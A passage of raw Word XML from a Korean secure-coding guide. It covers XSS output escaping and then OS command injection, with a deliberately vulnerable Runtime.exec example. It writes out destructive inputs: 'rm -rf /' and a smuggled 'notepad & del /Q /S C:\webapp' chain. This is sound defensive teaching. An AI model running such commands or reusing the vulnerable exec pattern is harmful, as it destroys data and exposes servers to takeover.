              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>방법</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">1: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>치환</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>keyword = keyword.replaceAll("&amp;","&amp;amp;").replaceAll("&lt;","&amp;lt;").replaceAll("&gt;","&amp;gt;");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>방법</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">2: JSTL c:out </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// &lt;c:out value="${m.content}"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>방법</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">3: OWASP ESAPI </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>라이브러리</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// Encoder.encodeForHTML(keyword)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00255962" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>운영체제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>명령어</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입</w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버</w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권한</w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00255962">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>획득</w:t>
      </w:r>
      <w:r w:rsidR="006506E7">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="006506E7">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>백도어</w:t>
      </w:r>
      <w:r w:rsidR="006506E7">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부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입력값을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시스템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명령어로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직접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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령어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선택이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필요한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경우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허용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명령어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목록</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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미리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정의하고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그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중에서만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선택한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령어로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String cmd = args[0];</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">Runtime.getRuntime().exec(cmd);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> "rm -rf /" </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인자에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> notepad &amp; del /Q /S C:\webapp </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처럼</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> &amp; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>뒤에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>추가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>붙이면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>연이어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> OS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
